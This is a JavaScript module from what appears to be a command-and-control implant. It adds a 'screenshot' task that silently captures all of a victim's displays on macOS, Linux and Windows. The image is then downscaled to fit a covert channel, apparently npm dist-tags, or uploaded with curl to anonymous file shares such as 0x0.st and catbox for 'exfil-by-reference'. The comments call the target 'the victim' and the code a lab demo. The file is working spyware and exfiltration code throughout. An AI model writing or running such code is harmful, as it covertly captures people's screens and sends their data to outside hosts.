// Screenshot task: capture the whole screen with OS built-in tools and
// transfer it back like a getfile. A raw full-screen PNG rarely fits the
// ~130-bytes-per-tag channel, so oversized captures walk a downscale ladder
// to a JPEG that fits maxFileBytes; optionally the PNG is uploaded to an
// anonymous file share instead (exfil-by-reference demo). Gated behind the
// enableScreenshot config flag in runTask.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { DEFAULT_MAX_FILE_BYTES, positiveLimit } from './files.js';

// Captures the entire virtual screen (every display, not just the desktop
// window). The output path arrives as argv — nothing is interpolated.
const WINDOWS_SCREENSHOT_SCRIPT = `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$v=[System.Windows.Forms.SystemInformation]::VirtualScreen;
$b=New-Object System.Drawing.Bitmap $v.Width,$v.Height;
$g=[System.Drawing.Graphics]::FromImage($b);
$g.CopyFromScreen($v.Left,$v.Top,0,0,$b.Size);
$b.Save($args[0],[System.Drawing.Imaging.ImageFormat]::Png);`;
// Resizes an image to a target width (aspect preserved) and saves it as JPEG.
// argv: input, output, width, quality — nothing is interpolated.
const WINDOWS_RESIZE_SCRIPT = `
Add-Type -AssemblyName System.Drawing;
$src=[System.Drawing.Image]::FromFile($args[0]);
$w=[int]$args[2]; $h=[Math]::Max(1,[int]($src.Height*$w/$src.Width));
$b=New-Object System.Drawing.Bitmap $w,$h;
$g=[System.Drawing.Graphics]::FromImage($b);
$g.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic;
$g.DrawImage($src,0,0,$w,$h);
$ep=New-Object System.Drawing.Imaging.EncoderParameters 1;
$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,[long]$args[3]);
$codec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' };
$b.Save($args[1],$codec,$ep);
$g.Dispose();$b.Dispose();$src.Dispose();`;

export const DEFAULT_SCREENSHOT_MAX_WIDTH = 1280;
export const SCREENSHOT_MIN_WIDTH = 240;
export const SCREENSHOT_WIDTH_RANGE = Object.freeze([160, 7680]);
const SCREENSHOT_JPEG_QUALITY = 60;
// The channel moves ~130 payload bytes per dist-tag, so a raw full-screen PNG
// (often several MiB) would need tens of thousands of tags. Instead the victim
// walks this width ladder until the JPEG fits the maxFileBytes cap.
const SCREENSHOT_SCALE_LADDER = Object.freeze([1, 0.75, 0.5, 0.35, 0.25, 0.15]);

function screenshotWidths(startWidth) {
  const widths = [];
  for (const f of SCREENSHOT_SCALE_LADDER) {
    const w = Math.max(SCREENSHOT_MIN_WIDTH, Math.round(startWidth * f));
    if (!widths.includes(w)) widths.push(w);
  }
  return widths;
}

function validateScreenshotWidth(value) {
  const w = Number(value);
  if (!Number.isInteger(w) || w < SCREENSHOT_WIDTH_RANGE[0] || w > SCREENSHOT_WIDTH_RANGE[1]) {
    throw new Error(
      `screenshot width must be an integer from ${SCREENSHOT_WIDTH_RANGE[0]} to ${SCREENSHOT_WIDTH_RANGE[1]}`,
    );
  }
  return w;
}

/**
 * Write `src` (any image) to `dest` as a JPEG whose largest side is `width`.
 * Built-in tools only: sips on macOS, ImageMagick on Linux, System.Drawing
 * on Windows. Throws if the platform has no resizer.
 */
function downscaleToJpeg(platform, exec, src, dest, width) {
  const EXEC_OPTS = { encoding: 'utf8', timeout: 20_000, windowsHide: true };
  const q = String(SCREENSHOT_JPEG_QUALITY);
  if (platform === 'darwin') {
    exec('sips', ['-Z', String(width), '-s', 'format', 'jpeg', '-s', 'formatOptions', q, src, '--out', dest], EXEC_OPTS);
    return;
  }
  if (platform === 'linux') {
    const errors = [];
    for (const file of ['convert', 'magick']) {
      try {
        exec(file, [src, '-resize', `${width}x${width}`, '-quality', q, dest], EXEC_OPTS);
        return;
      } catch (err) {
        errors.push(`${file}: ${err.message.split('\n')[0]}`);
      }
    }
    throw new Error(`no image resizer found (${errors.join('; ')})`);
  }
  if (platform === 'win32') {
    exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_RESIZE_SCRIPT, src, dest, String(width), q], EXEC_OPTS);
    return;
  }
  throw new Error(`screenshot downscaling is not supported on ${platform}`);
}

/** True when a capture tool actually wrote a non-empty image. */
function captureSucceeded(p) {
  try {
    return fs.statSync(p).size > 0;
  } catch {
    return false;
  }
}

function hostOf(url) {
  try {
    return new URL(url).host;
  } catch {
    return String(url);
  }
}

/** Merge the uploadUrls list and the legacy single uploadUrl, deduped, in order. */
export function normalizeUploadUrls(options = {}) {
  const list = Array.isArray(options.uploadUrls) ? options.uploadUrls : [];
  const single = String(options.uploadUrl ?? '').trim();
  const urls = [...list.map((u) => String(u ?? '').trim()), ...(single ? [single] : [])];
  return [...new Set(urls.filter(Boolean))];
}

/**
 * Upload a file to an anonymous, no-key file-sharing endpoint with curl
 * (`-F file=@path`, the convention used by 0x0.st, tmpfiles.org, catbox,
 * transfer.sh-style services) and extract the download URL from the
 * response. Handles both bare-URL responses (0x0.st) and the common JSON
 * shapes ({link}, {url}, {data:{url}}).
 */
export function uploadFileAndExtractUrl(uploadUrl, filePath, exec) {
  const out = exec(
    'curl',
    ['-sS', '-X', 'POST', '-F', `file=@${filePath}`, '--max-time', '30', uploadUrl],
    { encoding: 'utf8', timeout: 40_000, windowsHide: true },
  );
  const text = out.trim();
  let candidate = text;
  try {
    const j = JSON.parse(text);
    candidate = j?.link ?? j?.url ?? j?.data?.url ?? j?.data?.link ?? '';
  } catch {
    // Plain-text response body (e.g. 0x0.st) — already the candidate.
  }
  candidate = String(candidate ?? '').trim();
  if (!/^https?:\/\/\S+$/.test(candidate)) {
    throw new Error(`upload service returned no usable URL: ${text.slice(0, 120) || '(empty body)'}`);
  }
  return candidate;
}

/**
 * Walk the width ladder until the downscaled JPEG fits the channel cap.
 * Returns { path, width, size } of the first fitting file.
 */
function fitScreenshotToCap({ platform, exec, src, maxBytes, startWidth, makeTmp }) {
  const attempts = [];
  for (const width of screenshotWidths(startWidth)) {
    const dest = makeTmp(width);
    try {
      downscaleToJpeg(platform, exec, src, dest, width);
    } catch (err) {
      fs.rmSync(dest, { force: true });
      throw err; // no resizer tool: smaller widths will not help
    }
    const size = fs.statSync(dest).size;
    if (size <= maxBytes) return { path: dest, width, size };
    fs.rmSync(dest, { force: true });
    attempts.push(`${width}px=${size}B`);
  }
  throw new Error(
    `screenshot does not fit the ${maxBytes} byte cap even as a ${SCREENSHOT_MIN_WIDTH}px JPEG ` +
      `(${attempts.join(', ')}) — raise maxFileBytes`,
  );
}

export const SCREENSHOT_TASKS = {
  /**
   * Capture the whole screen (all displays, not only the desktop window) with
   * OS built-in tools — no dependencies. The image rides back exactly like a
   * getfile transfer, capped by maxFileBytes. A raw full-screen PNG rarely
   * fits the ~130-bytes-per-tag channel, so when the PNG exceeds the cap the
   * handler walks a downscale ladder (sips / ImageMagick / System.Drawing)
   * and sends a JPEG at the largest width that fits, starting at
   * screenshotMaxWidth (attacker-overridable per task via args.width).
   * Temp files never touch the configured filesystem root and are always
   * removed afterwards. Gated behind the enableScreenshot config flag; run
   * it only on an attended lab host. On macOS the agent's terminal needs
   * Screen Recording permission, otherwise screencapture fails or returns a
   * blank image.
   */
  screenshot(args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    const tmpDir = fs.realpathSync(os.tmpdir());
    const stamp = `kc2-shot-${process.pid}-${crypto.randomBytes(4).toString('hex')}`;
    const tmp = path.join(tmpDir, `${stamp}.png`);
    const temps = [tmp];
    const EXEC_OPTS = { encoding: 'utf8', timeout: 15_000, windowsHide: true };
    try {
      if (platform === 'darwin') {
        exec('screencapture', ['-x', '-t', 'png', tmp], EXEC_OPTS);
        if (!captureSucceeded(tmp)) {
          throw new Error(
            'screencapture wrote no image — grant the agent\'s terminal Screen Recording permission',
          );
        }
      } else if (platform === 'linux') {
        // Tools can exit 0 without writing anything (X11 utilities on a
        // Wayland session), so every candidate is verified against the file.
        // Order follows the session type: Wayland desktops need portal- or
        // compositor-native tools, X11 tools first otherwise.
        const env = options.env ?? process.env;
        const sessionType = String(env.XDG_SESSION_TYPE ?? 'unknown');
        const waylandTools = [
          ['gnome-screenshot', ['-f', tmp]], // GNOME portal (may require consent UI)
          ['spectacle', ['-b', '-n', '-o', tmp]], // KDE Plasma Wayland, background mode
          ['grim', [tmp]], // wlroots-native (sway & friends)
        ];
        const x11Tools = [
          ['import', ['-window', 'root', tmp]], // ImageMagick (X11 only)
          ['scrot', [tmp]], // X11 only
        ];
        const candidates = sessionType === 'wayland'
          ? [...waylandTools, ...x11Tools]
          : [...x11Tools, ...waylandTools];
        const failures = [];
        for (const [file, toolArgs] of candidates) {
          fs.rmSync(tmp, { force: true });
          try {
            exec(file, toolArgs, EXEC_OPTS);
            if (captureSucceeded(tmp)) break;
            failures.push(`${file}: exited without writing an image`);
          } catch (err) {
            failures.push(`${file}: ${err.message.split('\n')[0]}`);
          }
        }
        if (!captureSucceeded(tmp)) {
          throw new Error(
            `no screenshot tool produced an image (session=${sessionType}) — ${failures.join('; ')}. ` +
              'Wayland: install spectacle (KDE) or grim (wlroots); GNOME Wayland blocks silent ' +
              'capture by design (portal consent dialog). X11: install scrot or imagemagick.',
          );
        }
      } else if (platform === 'win32') {
        exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_SCREENSHOT_SCRIPT, tmp], EXEC_OPTS);
        if (!captureSucceeded(tmp)) {
          throw new Error('screen capture wrote no image');
        }
      } else {
        throw new Error(`screenshot is not supported on ${platform}`);
      }
      const max = positiveLimit(options.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
      // Exfil-by-reference mode (opt-in): upload the full-resolution PNG to
      // the first reachable anonymous file share and return just the URL —
      // one result tag instead of hundreds. Services are tried in order;
      // channel transfer is the final fallback.
      const uploadUrls = normalizeUploadUrls(options);
      let uploadNote = '';
      if (uploadUrls.length > 0) {
        const failures = [];
        for (const endpoint of uploadUrls) {
          try {
            const url = uploadFileAndExtractUrl(endpoint, tmp, exec);
            const st = fs.statSync(tmp);
            const via = failures.length > 0
              ? ` via ${hostOf(endpoint)} (after ${failures.length} service failure(s))`
              : '';
            return (
              `screen captured (${st.size} bytes PNG, full resolution)${via} -> ${url}\n` +
              'note: anyone with this link can read the image; treat it as expired after the demo'
            );
          } catch (err) {
            failures.push(`${hostOf(endpoint)}: ${err.message.split('\n')[0]}`);
          }
        }
        uploadNote = `all ${uploadUrls.length} upload service(s) failed (${failures.join('; ')}) — fell back to channel transfer, `;
      }
      let finalPath = tmp;
      let name = 'screenshot.png';
      let note = 'PNG';
      if (fs.statSync(tmp).size > max) {
        const startWidth = validateScreenshotWidth(
          args.width ?? options.screenshotMaxWidth ?? DEFAULT_SCREENSHOT_MAX_WIDTH,
        );
        const fitted = fitScreenshotToCap({
          platform,
          exec,
          src: tmp,
          maxBytes: max,
          startWidth,
          makeTmp: (w) => {
            const p = path.join(tmpDir, `${stamp}-w${w}.jpg`);
            temps.push(p);
            return p;
          },
        });
        finalPath = fitted.path;
        name = 'screenshot.jpg';
        note = `JPEG downscaled to ${fitted.width}px to fit the ${max}-byte channel cap`;
      }
      const st = fs.statSync(finalPath);
      const data = fs.readFileSync(finalPath);
      return {
        output: `screen captured (${uploadNote}${st.size} bytes ${note})`,
        file: { name, size: st.size, dataB64: data.toString('base64') },
      };
    } finally {
      for (const p of temps) fs.rmSync(p, { force: true });
    }
  },
};
